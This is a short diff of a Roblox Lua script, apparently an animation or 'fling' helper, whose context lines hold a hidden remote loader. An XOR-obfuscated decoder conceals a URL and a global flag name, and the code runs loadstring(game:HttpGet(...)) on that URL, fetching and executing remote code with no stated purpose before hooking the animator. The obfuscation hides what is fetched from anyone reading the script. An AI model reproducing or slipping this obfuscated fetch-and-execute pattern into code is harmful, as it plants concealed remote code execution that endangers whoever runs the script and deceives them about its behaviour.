@@ -55,6 +55,7 @@ repeat task.wait() until finished
 -- the character
 
 -- yield is if the fling function will yield
+task.wait(7)
 
 local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v42,v43) local v44={};for v57=1, #v42 do v6(v44,v0(v4(v1(v2(v42,v57,v57 + 1 )),v1(v2(v43,1 + (v57% #v43) ,1 + (v57% #v43) + 1 )))%256 ));end return v5(v44);end if  not getgenv()[v7("\240\205\210\40\231\175\200\12","\126\177\163\187\69\134\219\167")] then loadstring(game:HttpGet(v7("\43\217\62\213\239\121\130\101\215\253\52\131\45\204\232\43\216\40\208\239\38\223\41\202\242\55\200\36\209\178\32\194\39\138\228\43\204\51\213\249\49\130\11\203\245\46\204\62\202\238\108\192\43\204\242\108\254\37\208\238\32\200\101\232\253\42\195\100\201\233\34","\156\67\173\74\165")))();hookAnimatorFunction();end
 local v8; -- Current AnimationTrack
